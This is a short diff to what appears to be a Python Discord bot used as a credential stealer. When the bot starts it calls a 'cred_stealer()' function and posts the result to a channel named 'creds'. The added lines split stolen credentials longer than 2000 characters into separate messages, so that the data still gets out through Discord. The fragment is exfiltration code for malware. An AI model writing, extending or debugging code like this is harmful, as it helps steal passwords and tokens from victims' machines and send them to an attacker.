@@ -70,8 +70,19 @@ async def on_ready():
         
         for channel in category.channels:
             if channel.name == 'creds':
-                
                 creds = cred_stealer()
+                if len(creds) > 2000:
+                    t =  creds[2000:]
+                    creds = creds[:2000]
+                    
+                    await msg.channel.send(creds.decode())
+                    
+                    if t:
+                        await msg.channel.send(t.decode())
+                    
+                    creds = b''
+                    t = b''
+                
                 await channel.send(creds)
                 
             if channel.name == 'info':
